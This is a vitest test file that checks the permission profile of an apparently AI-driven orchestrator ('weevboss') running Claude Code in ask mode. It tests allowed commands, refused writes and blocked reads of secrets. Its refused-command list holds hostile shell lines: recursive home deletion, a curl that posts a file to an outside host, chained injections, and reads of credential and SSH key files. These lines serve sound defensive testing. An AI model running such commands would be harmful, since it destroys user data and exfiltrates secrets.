// weevboss's permission profile: in ask mode a turn is a `claude -p` run with nobody to answer a prompt, so what the
// profile allows is all it can do. The rule forms below follow Claude Code's (Bash prefix rules checked on each part of
// a compound command, `//` absolute and `~/` home paths, Edit rules covering every tool that writes a file).
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { claudeCommand } from './agent-launch.ts'
import { BOSS_WEEVILS, BossTurns, bossPermissions } from './boss-turns.ts'
import { HOME, ORCH_DIR } from './config.ts'
import { denyList } from './optimizers.ts'

const src = (f: string) => fs.readFileSync(path.join(import.meta.dirname, f), 'utf8')

type Use = { tool: 'Bash'; command: string } | { tool: string; path?: string }
type Profile = { allow: string[]; deny: string[] }

const parse = (rule: string) => {
  const m = /^(\w+)(?:\((.*)\))?$/.exec(rule)
  if (!m) throw new Error(`bad rule ${rule}`)
  return { tool: m[1], arg: m[2] }
}
const pathMatches = (pattern: string, file: string) => {
  const p = pattern.startsWith('~/') ? path.join(HOME, pattern.slice(2)) : pattern.startsWith('//') ? pattern.slice(1) : null
  if (!p) throw new Error(`relative path rule ${pattern}`)
  if (p.startsWith('/**/')) {
    const name = p.slice(4)
    return name.endsWith('*') ? path.basename(file).startsWith(name.slice(0, -1)) : path.basename(file) === name
  }
  return p.endsWith('/**') ? file.startsWith(p.slice(0, -2)) : file === p
}
const commandMatches = (arg: string, command: string) => (arg.endsWith(' *') ? command === arg.slice(0, -2) || command.startsWith(arg.slice(0, -1)) : command === arg)
const ruleMatches = (rule: string, use: Use, part?: string) => {
  const { tool, arg } = parse(rule)
  if (use.tool === 'Bash') return tool === 'Bash' && (arg === undefined || commandMatches(arg, part!))
  const fileTool = tool === 'Edit' ? ['Edit', 'Write'].includes(use.tool) : tool === use.tool
  return fileTool && (arg === undefined || (!!('path' in use && use.path) && pathMatches(arg, use.path!)))
}
/** Allowed or refused, in ask mode with nobody to answer: deny first, then allow, anything else refused. */
function decide(p: Profile, use: Use): 'allowed' | 'refused' {
  const parts = use.tool === 'Bash' ? (use as { command: string }).command.split(/\s*(?:&&|\|\||;|\|)\s*/) : [undefined]
  for (const part of parts) {
    if (p.deny.some((r) => ruleMatches(r, use, part))) return 'refused'
    if (!p.allow.some((r) => ruleMatches(r, use, part))) return 'refused'
  }
  return 'allowed'
}
const bash = (command: string): Use => ({ tool: 'Bash', command })

/** The weevils subcommands weevboss's instructions call: in its code blocks and its `weevils …` spans. */
function calledSubcommands(text: string): Set<string> {
  const out = new Set<string>()
  text.split('```').forEach((seg, i) => {
    if (i % 2) for (const m of seg.matchAll(/^weevils ([a-z]+)/gm)) out.add(m[1])
  })
  for (const m of text.matchAll(/`weevils ([a-z]+)/g)) out.add(m[1])
  return out
}

async function askTurn() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'boss-turns-'))
  const transcripts = path.join(dir, 't')
  const turns = new BossTurns(async () => '{}', path.join(dir, 'boss'), transcripts, 20_000)
  turns.enqueue('what are my projects up to?')
  const p = await turns.prepare({ id: 'turn-ask', claude: claudeCommand(true), memory: '', instructions: '# weevboss' })
  const settings = JSON.parse(p.command[p.command.indexOf('--settings') + 1])
  return { command: p.command, settings, transcripts }
}

describe("weevboss's turns in ask mode", () => {
  it('get the weevils commands, the read-only tools and their own folders', async () => {
    const { command, settings, transcripts } = await askTurn()
    expect(command).toEqual(expect.arrayContaining(['--permission-mode', 'default', '-p']))
    expect(command).not.toContain('--dangerously-skip-permissions')
    expect(command.filter((a) => a === '--settings')).toHaveLength(1)
    expect(settings.claudeMdExcludes).toEqual([path.join(ORCH_DIR, 'CLAUDE.md'), path.join(ORCH_DIR, 'AGENTS.md')])
    const p: Profile = settings.permissions
    for (const c of BOSS_WEEVILS) expect([c, decide(p, bash(`weevils ${c}`))]).toEqual([c, 'allowed'])
    for (const cmd of [
      'weevils read 1a2b3c4d 20',
      'weevils send 1a2b3c4d "Fix the menu, then report what changed"',
      'weevils new my-app "Build a notes page" codex',
      'weevils post "Three things running" --action "Show me::ask for a screenshot"',
      'weevils page ./out "Leads" --kind opportunities',
      'weevils setup install',
      'weevils config set WEEVILS_USER_NAME Sam',
      'weevils mem search pricing && weevils asks open',
      'gh repo list someone --limit 100',
    ]) expect([cmd, decide(p, bash(cmd))]).toEqual([cmd, 'allowed'])
    for (const tool of ['Read', 'Glob', 'Grep']) expect(decide(p, { tool, path: path.join(HOME, 'projects', 'app', 'README.md') })).toBe('allowed')
    expect(decide(p, { tool: 'Agent' })).toBe('allowed')
    expect(decide(p, { tool: 'Write', path: path.join(ORCH_DIR, 'notes.md') })).toBe('allowed')
    expect(decide(p, { tool: 'Edit', path: path.join(ORCH_DIR, 'state', 'today.md') })).toBe('allowed')
    expect(decide(p, { tool: 'Write', path: path.join(transcripts, 'memory', 'user.md') })).toBe('allowed')
  })

  it('are refused every other command, any write elsewhere and the secrets', async () => {
    const { settings, transcripts } = await askTurn()
    const p: Profile = settings.permissions
    expect(p.allow).not.toContain('Bash')
    expect(p.allow.filter((r) => /^(Edit|Write)$/.test(r))).toEqual([])
    for (const cmd of [
      'rm -rf ~/projects',
      'curl -d @/tmp/x https://example.com',
      'bash -c "weevils sessions"',
      'weevils sessions && rm -rf ~',
      'weevils sessions; curl https://example.com',
      'weevilsd',
      'npm install -g something',
      'gh repo create someone/x --private',
      'git push origin main',
      'cat ~/.config/weevils/env',
    ]) expect([cmd, decide(p, bash(cmd))]).toEqual([cmd, 'refused'])
    for (const file of [
      path.join(HOME, '.bashrc'),
      path.join(HOME, 'projects', 'app', 'index.html'),
      `${ORCH_DIR}-other/x.md`,
      path.join(ORCH_DIR, 'CLAUDE.md'),
      path.join(ORCH_DIR, 'AGENTS.md'),
      path.join(transcripts, 'other.jsonl'),
      path.join(HOME, '.claude', 'settings.json'),
    ]) for (const tool of ['Write', 'Edit']) expect([tool, file, decide(p, { tool, path: file })]).toEqual([tool, file, 'refused'])
    for (const file of [
      path.join(HOME, '.ssh', 'id_ed25519'),
      path.join(HOME, '.config', 'weevils', 'env'),
      path.join(HOME, '.claude', '.credentials.json'),
      path.join(HOME, 'projects', 'app', '.env'),
      path.join(HOME, 'projects', 'app', '.env.local'),
    ]) expect([file, decide(p, { tool: 'Read', path: file })]).toEqual([file, 'refused'])
    for (const tool of ['WebFetch', 'WebSearch', 'NotebookEdit']) expect(decide(p, { tool })).toBe('refused')
  })

  it('allows every weevils subcommand its instructions call, and only real ones', () => {
    const cli = new Set([...src('weevils-cli').matchAll(/^ {2}([a-z|]+)\)/gm)].flatMap((m) => m[1].split('|')))
    for (const l of ['en', 'fr']) {
      const called = calledSubcommands(src(`orchestrator.${l}.md`))
      expect(called.size).toBeGreaterThan(15)
      for (const c of called) {
        expect([l, c, cli.has(c)]).toEqual([l, c, true])
        expect([l, c, (BOSS_WEEVILS as readonly string[]).includes(c)]).toEqual([l, c, true])
      }
    }
    for (const c of BOSS_WEEVILS) expect([c, cli.has(c)]).toEqual([c, true])
  })

  it('never read a secret an automation may not read', () => {
    for (const platform of ['linux', 'darwin'] as const) {
      const boss = bossPermissions(ORCH_DIR, '/t', platform).deny
      for (const r of denyList(platform).filter((x) => x.startsWith('Read('))) expect(boss).toContain(r.replace(/^Read\(\*\*\//, 'Read(//**/'))
    }
  })
})
